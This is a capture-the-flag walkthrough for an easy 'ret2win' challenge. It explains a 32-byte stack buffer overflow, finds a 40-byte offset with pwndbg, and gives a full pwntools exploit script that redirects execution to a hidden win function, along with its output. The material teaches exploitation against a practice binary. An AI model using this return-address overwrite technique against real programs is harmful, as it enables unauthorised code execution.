# ret2win

## Difficulty: Easy
## Category: Binary Exploitation (Pwn)

---

## Overview

`ret2win` is a classic introductory binary exploitation challenge. The goal is to redirect execution to a hidden `win()` function using a stack buffer overflow — hence the name *ret2win*.

---

## Enumeration

Start by examining the binary:

```bash
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
- **No stack canary** — we can overflow without detection
- **No PIE** — addresses are static and predictable
- **NX enabled** — can't execute shellcode on the stack, but we don't need to

---

## Finding the Vulnerability

Open in Ghidra or run with `gdb`:

```bash
$ gdb ./ret2win
pwndbg> disass main
```

The `pwnme()` function has a classic buffer overflow:

```c
void pwnme() {
    char buf[32];
    read(0, buf, 56);  // reads 56 bytes into a 32-byte buffer
}
```

There's also a `ret2win()` function that prints the flag:

```bash
pwndbg> info functions
0x0000000000400756  ret2win
```

---

## Finding the Offset

Use `pwndbg` cyclic pattern to find the exact offset to `RIP`:

```bash
pwndbg> cyclic 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa

pwndbg> run <<< $(cyclic 50)
# Program crashes

pwndbg> cyclic -l $rsp_value
40
```

Offset to `RIP` is **40 bytes**.

---

## Crafting the Exploit

```python
from pwn import *

elf = ELF('./ret2win')
p = process('./ret2win')

win_addr = elf.symbols['ret2win']  # 0x400756

payload  = b'A' * 40        # fill buffer + saved RBP
payload += p64(win_addr)    # overwrite return address

p.sendline(payload)
p.interactive()
```

---

## Getting the Flag

```bash
$ python3 exploit.py
[*] '/home/m0j0/ctf/ret2win'
    Arch:     amd64-64-little
[+] Starting local process './ret2win': pid 12345
Thank you! Here's your flag:
ROPE{a_placeholder_for_learning}
```

---

## Key Takeaways

- `ret2win` is the foundation of all ROP-based exploitation
- Always check `checksec` first to understand mitigations in play
- When NX is enabled but PIE is off, look for useful functions to jump to
- `pwntools` makes exploit development significantly faster

## Tools Used

| Tool | Purpose |
|------|---------|
| `pwntools` | Exploit scripting |
| `pwndbg` | GDB enhancement for pwn |
| `Ghidra` | Decompilation / reversing |
| `checksec` | Binary mitigation check |
